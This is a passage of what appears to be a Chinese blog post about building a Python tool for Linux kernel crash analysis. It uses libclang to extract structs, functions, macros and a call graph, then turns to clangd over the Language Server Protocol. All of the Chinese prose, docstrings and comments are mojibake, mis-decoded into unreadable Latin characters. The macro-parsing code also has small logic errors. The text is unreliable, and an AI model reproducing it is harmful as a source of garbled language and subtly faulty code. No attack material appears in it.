class="built_in">str</span> = <span class="string">&#x27;x86&#x27;</span></span>):</span><br><span class="line">        self.file_path = os.path.abspath(file_path)</span><br><span class="line">        self.kernel_root = kernel_root <span class="keyword">or</span> self._auto_detect_kernel_root()</span><br><span class="line">        self.arch = arch</span><br><span class="line">        self.ast = self._parse_ast()</span><br><span class="line">        self.structs: <span class="type">List</span>[StructDef] = []</span><br><span class="line">        self.functions: <span class="type">List</span>[FunctionDef] = []</span><br><span class="line">        self.macros: <span class="type">List</span>[MacroDef] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_auto_detect_kernel_root</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;è‡ªåŠ¨æ£€æµ‹å†…æ ¸æ ¹ç›®å½•&quot;&quot;&quot;</span></span><br><span class="line">        current_dir = os.path.dirname(self.file_path)</span><br><span class="line">        <span class="keyword">while</span> current_dir != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(os.path.join(current_dir, <span class="string">&#x27;Kbuild&#x27;</span>)):</span><br><span class="line">                <span class="keyword">return</span> current_dir</span><br><span class="line">            current_dir = os.path.dirname(current_dir)</span><br><span class="line">        <span class="keyword">raise</span> ParseError(<span class="string">&quot;æ— æ³•è‡ªåŠ¨æ£€æµ‹å†…æ ¸æ ¹ç›®å½•ï¼Œè¯·æ‰‹åŠ¨æŒ‡å®š kernel_root&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_include_args</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;ç”Ÿæˆå†…æ ¸å¤´æ–‡ä»¶åŒ…å«è·¯å¾„&quot;&quot;&quot;</span></span><br><span class="line">        includes = [</span><br><span class="line">            <span class="string">&#x27;-I&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;include&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;-I&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;arch&#x27;</span>, self.arch, <span class="string">&#x27;include&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;-I&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;include/uapi&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;-include&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;include/linux/kconfig.h&#x27;</span>)</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">return</span> includes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_ast</span>(<span class="params">self</span>) -&gt; TranslationUnit:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;è§£æç”Ÿæˆ AST&quot;&quot;&quot;</span></span><br><span class="line">        index = Index.create()</span><br><span class="line">        args = [</span><br><span class="line">            <span class="string">&#x27;-D__KERNEL__&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-D__KASAN__&#x27;</span>,</span><br><span class="line">            <span class="string">f&#x27;-D__ARCH_<span class="subst">&#123;self.arch.upper()&#125;</span>_&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-nostdinc&#x27;</span>,  <span class="comment"># å¿½ç•¥æ ‡å‡†å¤´æ–‡ä»¶</span></span><br><span class="line">            <span class="string">&#x27;-Wno-everything&#x27;</span>,  <span class="comment"># ç¦ç”¨è­¦å‘Š</span></span><br><span class="line">            *self._get_include_args()</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> index.parse(</span><br><span class="line">                self.file_path,</span><br><span class="line">                args=args,</span><br><span class="line">                options=TranslationUnit.PARSE_DETAILED_PROCESSING_RECORD</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> ParseError(<span class="string">f&quot;AST è§£æå¤±è´¥: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_walk_ast</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;éå† AST å¹¶æå–å…³é”®ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> cursor.location.file <span class="keyword">and</span> cursor.location.file.name != self.file_path:</span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># è·³è¿‡å…¶ä»–æ–‡ä»¶</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> cursor.kind == CursorKind.STRUCT_DECL <span class="keyword">and</span> cursor.is_definition():</span><br><span class="line">            self._process_struct(cursor)</span><br><span class="line">        <span class="keyword">elif</span> cursor.kind == CursorKind.TYPEDEF_DECL:</span><br><span class="line">            self._process_typedef(cursor)</span><br><span class="line">        <span class="keyword">elif</span> cursor.kind == CursorKind.FUNCTION_DECL:</span><br><span class="line">            self._process_function(cursor)</span><br><span class="line">        <span class="keyword">elif</span> cursor.kind == CursorKind.MACRO_DEFINITION:</span><br><span class="line">            self._process_macro(cursor)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># é€’å½’éå†å­èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">for</span> child <span class="keyword">in</span> cursor.get_children():</span><br><span class="line">            self._walk_ast(child)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_struct</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¤„ç†ç»“æ„ä½“å®šä¹‰&quot;&quot;&quot;</span></span><br><span class="line">        members = []</span><br><span class="line">        <span class="keyword">for</span> child <span class="keyword">in</span> cursor.get_children():</span><br><span class="line">            <span class="keyword">if</span> child.kind == CursorKind.FIELD_DECL:</span><br><span class="line">                member_type = self._get_type_name(child.<span class="built_in">type</span>)</span><br><span class="line">                bit_width = child.get_bitfield_width() <span class="keyword">if</span> child.is_bitfield() <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">                members.append(StructMember(child.spelling, member_type, bit_width))</span><br><span class="line">        </span><br><span class="line">        self.structs.append(</span><br><span class="line">            StructDef(</span><br><span class="line">                name=cursor.spelling,</span><br><span class="line">                members=members,</span><br><span class="line">                line_range=(cursor.extent.start.line, cursor.extent.end.line)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_typedef</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¤„ç† typedef å®šä¹‰çš„ç»“æ„ä½“&quot;&quot;&quot;</span></span><br><span class="line">        underlying_type = cursor.underlying_typedef_type</span><br><span class="line">        <span class="keyword">if</span> underlying_type.get_declaration().kind == CursorKind.STRUCT_DECL:</span><br><span class="line">            struct_cursor = underlying_type.get_declaration()</span><br><span class="line">            <span class="keyword">if</span> struct_cursor.is_definition():</span><br><span class="line">                self._process_struct(struct_cursor)</span><br><span class="line">                <span class="comment"># æ ‡è®°ä¸º typedef</span></span><br><span class="line">                self.structs[-<span class="number">1</span>].is_typedef = <span class="literal">True</span></span><br><span class="line">                self.structs[-<span class="number">1</span>].name = cursor.spelling  <span class="comment"># ä½¿ç”¨ typedef åç§°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_function</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¤„ç†å‡½æ•°å®šä¹‰&quot;&quot;&quot;</span></span><br><span class="line">        return_type = self._get_type_name(cursor.result_type)</span><br><span class="line">        parameters = []</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> cursor.get_arguments():</span><br><span class="line">            param_type = self._get_type_name(param.<span class="built_in">type</span>)</span><br><span class="line">            parameters.append((param.spelling, param_type))</span><br><span class="line">        </span><br><span class="line">        self.functions.append(</span><br><span class="line">            FunctionDef(</span><br><span class="line">                name=cursor.spelling,</span><br><span class="line">                return_type=return_type,</span><br><span class="line">                parameters=parameters,</span><br><span class="line">                line_range=(cursor.extent.start.line, cursor.extent.end.line),</span><br><span class="line">                <span class="comment"># æ·»åŠ å…‰æ ‡</span></span><br><span class="line">                cursor=cursor</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_macro</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¤„ç†å®å®šä¹‰&quot;&quot;&quot;</span></span><br><span class="line">        macro_name = cursor.spelling</span><br><span class="line">        macro_token_generator = cursor.get_tokens()</span><br><span class="line">        macro_value = <span class="built_in">next</span>(macro_token_generator).spelling  </span><br><span class="line">        is_function_like = <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> macro_name  <span class="comment"># ç®€å•åˆ¤æ–­æ˜¯å¦ä¸ºå‡½æ•°å¼å®</span></span><br><span class="line">        </span><br><span class="line">        self.macros.append(</span><br><span class="line">            MacroDef(</span><br><span class="line">                name=macro_name,</span><br><span class="line">                value=macro_value,</span><br><span class="line">                line=cursor.location.line,</span><br><span class="line">                is_function_like=is_function_like</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_type_name</span>(<span class="params">self, clang_type</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;è·å–ç±»å‹çš„å®Œæ•´åç§°&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> clang_type.kind == TypeKind.POINTER:</span><br><span class="line">            pointee_type = self._get_type_name(clang_type.get_pointee())</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;pointee_type&#125;</span>*&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> clang_type.kind == TypeKind.ELABORATED:</span><br><span class="line">            <span class="keyword">return</span> clang_type.get_declaration().spelling</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> clang_type.spelling</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analyze</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ‰§è¡Œåˆ†æ&quot;&quot;&quot;</span></span><br><span class="line">        self._walk_ast(self.ast.cursor)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_call_graph</span>(<span class="params">self</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        è·å–å‡½æ•°è°ƒç”¨å›¾ï¼ˆç¤ºä¾‹æ‰©å±•åŠŸèƒ½ï¼‰</span></span><br><span class="line"><span class="string">        ç›®å‰å¯ç”¨ï¼Œå’Œidaç±»ä¼¼å•Š</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        call_graph = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> func <span class="keyword">in</span> self.functions:</span><br><span class="line">            caller = func.name</span><br><span class="line">            callees = []</span><br><span class="line">            <span class="comment"># éå†å‡½æ•°ä½“å†…çš„ CALL_EXPR èŠ‚ç‚¹</span></span><br><span class="line">            <span class="keyword">for</span> cursor <span class="keyword">in</span> func.cursor.walk_preorder():</span><br><span class="line">                <span class="keyword">if</span> cursor.kind == CursorKind.CALL_EXPR:</span><br><span class="line">                    callee = cursor.spelling</span><br><span class="line">                    <span class="keyword">if</span> callee:</span><br><span class="line">                        callees.append(callee)</span><br><span class="line">            call_graph[caller] = callees</span><br><span class="line">        <span class="keyword">return</span> call_graph</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># è¿™é‡ŒClangéœ€è¦å’Œç”µè„‘ä¸Šçš„clangç‰ˆæœ¬ç›¸ç¬¦åˆ</span></span><br><span class="line">    <span class="comment"># é…ç½® Clang åº“è·¯å¾„ï¼ˆæ ¹æ®å®é™…ç¯å¢ƒè°ƒæ•´ï¼‰</span></span><br><span class="line">    <span class="keyword">from</span> clang.cindex <span class="keyword">import</span> Config</span><br><span class="line">    <span class="comment"># Config.set_library_path(&quot;/usr/local/opt/llvm/lib&quot;)</span></span><br><span class="line">    Config.set_library_file(<span class="string">&quot;/usr/lib/libclang.so&quot;</span>)</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–è§£æå™¨</span></span><br><span class="line">    parser = ClangASTParser(</span><br><span class="line">        file_path=<span class="string">&quot;/home/zjw1nd/MyWorkingFlow/Kernel/kdump/linux-6.13.7/fs/btrfs/accessors.c&quot;</span>,</span><br><span class="line">        kernel_root=<span class="string">&#x27;/home/zjw1nd/MyWorkingFlow/Kernel/kdump/linux-6.13.7/&#x27;</span>,</span><br><span class="line">        arch=<span class="string">&quot;x86&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.analyze()</span><br><span class="line">    <span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== ç»“æ„ä½“ ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> struct <span class="keyword">in</span> parser.structs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;struct.name&#125;</span> (typedef=<span class="subst">&#123;struct.is_typedef&#125;</span>) @ lines <span class="subst">&#123;struct.line_range&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> struct.members:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;member.<span class="built_in">type</span>&#125;</span> <span class="subst">&#123;member.name&#125;</span><span class="subst">&#123;<span class="string">f&#x27; : <span class="subst">&#123;member.bit_width&#125;</span>&#x27;</span> <span class="keyword">if</span> member.bit_width <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== å‡½æ•° ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> parser.functions:</span><br><span class="line">        params = <span class="string">&#x27;, &#x27;</span>.join([<span class="string">f&quot;<span class="subst">&#123;t&#125;</span> <span class="subst">&#123;n&#125;</span>&quot;</span> <span class="keyword">for</span> n, t <span class="keyword">in</span> func.parameters])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;func.return_type&#125;</span> <span class="subst">&#123;func.name&#125;</span>(<span class="subst">&#123;params&#125;</span>) @ lines <span class="subst">&#123;func.line_range&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== å® ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> macro <span class="keyword">in</span> parser.macros:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;#define <span class="subst">&#123;macro.name&#125;</span> <span class="subst">&#123;macro.value&#125;</span> @ line <span class="subst">&#123;macro.line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> funct <span class="keyword">in</span> parser.get_call_graph():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Function <span class="subst">&#123;funct&#125;</span> calls: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(parser.get_call_graph()[funct])&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬çš„å·¥ä½œæ˜¯å¦‚æ­¤è‰¯å¥½ä»¥è‡³äºæˆ‘ä»¥ä¸ºäº‹æƒ…ä¼¼ä¹è§£å†³äº†ã€‚</p><h2 id="éš¾ä»¥è§£å†³çš„é—®é¢˜ï¼Ÿ">éš¾ä»¥è§£å†³çš„é—®é¢˜ï¼Ÿ</h2><p>linuxå†…æ ¸æ˜¯ä¸€ä¸ªæœ‰ç€å¤æ‚çš„å…³è”å…³ç³»çš„å¤§é¡¹ç›®ï¼Œåªå®ç°ä¸€ä¸ªæ–‡ä»¶çš„æŸ¥æ‰¾æ˜¾ç„¶æ˜¯ä¸å¤Ÿçš„ï¼Œç°åœ¨çš„æ ¸å¿ƒé—®é¢˜å°±å˜æˆäº†<strong>å¦‚ä½•å¤šæ–‡ä»¶/è·¨æ–‡ä»¶è¿›è¡ŒæŸ¥è¯¢</strong>ã€‚å´©æºƒç°åœºçš„å †æ ˆæä¾›çš„æºä»£ç ä½ç½®åªæ˜¯è¿”å›åœ°å€çš„ä½ç½®ï¼Œå…¶å®å¯¹äº<em>å®šä¹‰</em>çš„æ”¯æŒå¹¶ä¸å¥½ã€‚å¦‚æœå®šä¹‰åœ¨å…¶ä»–æ–‡ä»¶ä¸­å‘¢ï¼Ÿ</p><p>è‡ªç„¶è€Œç„¶åœ°æµ®ç°å‡ºä¸¤ç§æ€è·¯ï¼Œä¸€æ˜¯å°†æ‰€æœ‰çš„æºç ï¼Œä¸ç®¡ç”¨ä»€ä¹ˆåŠæ³•ï¼Œé›†åˆæˆä¸€ä¸ªåŒä¸€çš„æŸ¥è¯¢å®ä½“ï¼Œåœ¨å…¶ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚ä½†æ˜¯å¯¹äºASTæ¥è¯´ï¼Œclangçš„pythonåº“å¯¹äºå¤šä¸ªæ–‡ä»¶æ„å»ºé¡¹ç›®astçš„æ”¯æŒæ²¡æœ‰é‚£ä¹ˆå¥½ï¼Œè€Œä¸”linuxå†…æ ¸æºç å¤ªå¤§äº†ã€‚äºŒæ˜¯æƒ³åŠæ³•æŸ¥æ‰¾æŸç§å…³è”å…³ç³»ï¼Œæ¥ç€å¯¹å•ç‹¬çš„æ–‡ä»¶é€ä¸ªè°ƒç”¨æˆ‘ä»¬ä¸Šé¢çš„è„šæœ¬ã€‚ä½†æ˜¯è¿™åŒæ ·éœ€è¦linuxå†…æ ¸å„ä¸ªæ–‡ä»¶çš„ä¾èµ–å…³ç³»ã€‚</p><h2 id="å¯å‘æ€è·¯">å¯å‘æ€è·¯</h2><p>æˆ‘å½“ç„¶æ˜¯ä¸ç›¸ä¿¡è¿™ç§å·¥ä½œæ²¡æœ‰å‰äººåšçš„ï¼Œäºæ˜¯å°è¯•æœç´¢ç›¸å…³çš„å¼€æºé¡¹ç›®ã€‚å¼€æºçš„æ²¡æœ‰æ‰¾åˆ°ï¼Œè¯¢é—®AIä»–å‘Šè¯‰æˆ‘å¯ä»¥å‚è€ƒâ€œå¾®è½¯çš„scipâ€ï¼Œæˆ‘å°è¯•æœç´¢è¿™ä¸ªscipï¼Œå´é¡ºè—¤æ‘¸ç“œæ‰¾åˆ°äº†ä¸€ä¸ªå•†ä¸šè½¯ä»¶<a href="https://sourcegraph.com/">sourcegraph</a>ï¼Œæ˜¯ä¸“é—¨ç”¨æ¥æµè§ˆæºä»£ç çš„ã€‚ä»–åœ¨githubä¸Šå¼€æºäº†ä¸€ä¸ªæ’ä»¶å«<a href="https://github.com/sourcegraph/scip-clang">scip-clang</a>ï¼Œå³ç”¨clangä¾æ®compile_commands.jsonç”Ÿæˆæ•´ä¸ªé¡¹ç›®çš„ç´¢å¼•æ–‡ä»¶ç”¨æ¥å¿«é€Ÿæµè§ˆã€‚</p><blockquote><p>compile_commands.jsonå°±æ˜¯ç”¨jsonæ–‡ä»¶è®°å½•æ‰€æœ‰ç¼–è¯‘è¿‡ç¨‹ä¸­çš„å‘½ä»¤ã€‚è¿™ä¸ªæ–‡ä»¶ä¹Ÿè¢«ç§°ä¸ºâ€œç¼–è¯‘æ•°æ®åº“â€ã€‚åœ¨æ¯”è¾ƒæ–°çš„linuxå†…æ ¸ä¸­ï¼Œå·²ç»å¯ä»¥ç›´æ¥é€šè¿‡ä¸ºmakeå‘½ä»¤æ·»åŠ compile_commands.jsonå‘½ä»¤æ¥ç”Ÿæˆè¿™ä¸ªæ–‡ä»¶äº†ã€‚å¯¹äºæ›´ç³Ÿçš„ç‰ˆæœ¬ï¼Œè®¸å°±è¦å€ŸåŠ©bearå·¥å…·è¿›è¡Œç¼–è¯‘ã€‚</p></blockquote><p>è¿™ä¸ªä¸œè¥¿æ˜¯æˆ‘ä¹‹å‰ä¸çŸ¥é“çš„ã€‚è¿™ä¸ªæ’ä»¶è™½ç„¶å¼€æºï¼Œä½†å®ƒç”Ÿæˆçš„ç´¢å¼•æ–‡ä»¶æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè½¯ä»¶æœ¬èº«æ˜¯å•†ä¸šè½¯ä»¶æ‰€ä»¥å¾ˆå¯æƒœä¸èƒ½ç”¨ã€‚ä½†æ˜¯è¿™ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ–¹å‘ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥åœ¨è¿™ä¸ªç¼–è¯‘æ•°æ®åº“æ–‡ä»¶ä¸Šåšæ–‡ç« ï¼Ÿ</p><h1>â™¿èµ„æ–™æ”¶é›†ä¸­çš„çµå…‰ä¸€é—ªâ€“Language Server</h1><p>æ—¢ç„¶æœ‰æˆç†Ÿçš„å•†ä¸šåŒ–æ–¹æ¡ˆï¼Œæˆ‘è¯•å›¾ä»sourcegraphè¿™ä¸ªè½¯ä»¶å¼€æºçš„éƒ¨åˆ†æˆ–è€…å„ç§ä»‹ç»ä¸­æ‰¾åˆ°ä¸€äº›çµæ„Ÿã€‚èƒ¡ä¹±ç”¨å…³é”®è¯æœç´¢çš„æ—¶å€™ï¼Œæˆ‘çœ‹åˆ°äº†ä¸€ä¸ªç”¨VSCode+clangdæµè§ˆlinuxå†…æ ¸æºç çš„<a href="https://www.cnblogs.com/yann-qu/p/17956726">å¸–å­</a>ã€‚äº†è§£äº†ä¸€ä¸‹ï¼Œå‘ç°clangdæ˜¯ä¸€ä¸ªå«ä½œâ€œè¯­è¨€æœåŠ¡å™¨â€çš„ä¸œè¥¿ã€‚è¿™ä¸ªä¸œè¥¿å°±æ˜¯åœ¨IDEä¸­æä¾›é‚£äº›å¿«æ·è·³è½¬çš„æ ¸å¿ƒå¼•æ“ã€‚æˆ‘è‡ªå·±å¤ç°äº†ä¸€ä¸‹ï¼Œç”¨compile_commands.jsonå’Œclangdå»æµè§ˆlinuxå†…æ ¸æºç ï¼Œå‘ç°çš„ç¡®å¾ˆå¥½ç”¨ï¼Œç­‰å¾…clangdæ„å»ºå¥½ç´¢å¼•ä¹‹åæˆ‘åœ¨ä»£ç ä¸­å¯ä»¥éšä¾¿è·³è½¬å‡½æ•°å’Œç»“æ„çš„å®šä¹‰ã€‚<strong>è¿™ä¸å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½å—ï¼Ÿ</strong></p><p>äºæ˜¯å°±æœ‰äº†ç°åœ¨çš„æ€è·¯ï¼ŒæŸ¥æ‰¾äº†ä¸‹pythonå’Œclangdæ€ä¹ˆé€šä¿¡ï¼Œå‘ç°å¾®è½¯ä¸ºè¯­è¨€æœåŠ¡å™¨å®ç°äº†ä¸€å¥—åè®®æ ‡å‡†ï¼šLSP(Language Server Protocol)ï¼Œè¿™æ˜¯ä¸€å¥—jsonæ ¼å¼çš„é€šä¿¡åè®®ã€‚å¹¶ä¸”linuxä¸‹çš„è¯­è¨€æœåŠ¡å™¨å¯ä»¥å•ç‹¬è¿è¡Œï¼Œè€Œä¸”å…¶è¾“å…¥è¾“å‡ºæ˜¯ç›´æ¥é€šè¿‡stdinå’Œstdoutè¿›è¡Œäº¤äº’çš„ã€‚é‚£ä¸‹ä¸€æ­¥å½“ç„¶å°±æ˜¯æŸ¥æ‰¾pythonçš„lspé€šä¿¡åè®®åº“ï¼Œä¸è¿‡è¿™é‡Œæ²¡æœ‰æ‰¾åˆ°å¾ˆå¥½çš„ï¼Œåªæœ‰ä¸€ä¸ªç®€æ˜“çš„<a href="https://github.com/yeger00/pylspclient">lspå®¢æˆ·ç«¯</a>ï¼Œè€Œä¸”è¿˜æ²¡æœ‰ä»»ä½•æ¥å£æ–‡æ¡£å’Œexampleã€‚</p><p>è®©AIè¯»äº†ä¸‹è¿™ä¸ªåº“å¹¶ä¸”å¤§è‡´ç¼–å†™äº†ä¸€äº›æµ‹è¯•ï¼Œå‘ç°æœç„¶å¥½ç”¨ã€‚ç”¨è¿™ä¸ªè¯­è¨€æœåŠ¡å™¨ï¼ˆå…¶å®æ˜¯æˆ‘ä»¬åœ¨æ¨¡æ‹Ÿä¸€ä¸ªIDEæµè§ˆlinuxå†…æ ¸æºç ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥çœç•¥æ‰æ‰€æœ‰çš„æŸ¥æ‰¾ç»†èŠ‚ï¼Œåº•å±‚çš„å·¥ä½œå…¨äº¤ç»™clangdå¤„ç†ï¼ŒæŸ¥è¯¢å…¨é€æ˜ï¼Œæˆ‘ä»¬åªéœ€è¦å­¦ä¹ LSPåè®®çš„å¤§è‡´æ ¼å¼å°±å¯ä»¥äº†â€“ç”šè‡³åªè¦æœ‰åˆé€‚çš„å°è£…æˆ‘ä»¬ç”šè‡³ä¸éœ€è¦ç†Ÿæ‚‰LSPåè®®ã€‚ä¹Ÿæ˜¯æ‰¾åˆ°è½®æ¤…äº†ã€‚ä¸‹é¢æ˜¯ç¬¬ä¸€ç‰ˆçš„æµ‹ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pylspclient.lsp_endpoint <span class="keyword">import</span> LspEndpoint</span><br><span class="line"><span class="keyword">from</span> pylspclient.json_rpc_endpoint <span class="keyword">import</span> JsonRpcEndpoint</span><br><span class="line"><span class="keyword">from</span> pylspclient.lsp_client <span class="keyword">import</span> LspClient</span><br><span class="line"><span class="keyword">from</span> pylspclient.lsp_pydantic_strcuts <span class="keyword">import</span> (</span><br><span class="line">    TextDocumentItem, TextDocumentIdentifier, Position,</span><br><span class="line">    Location, 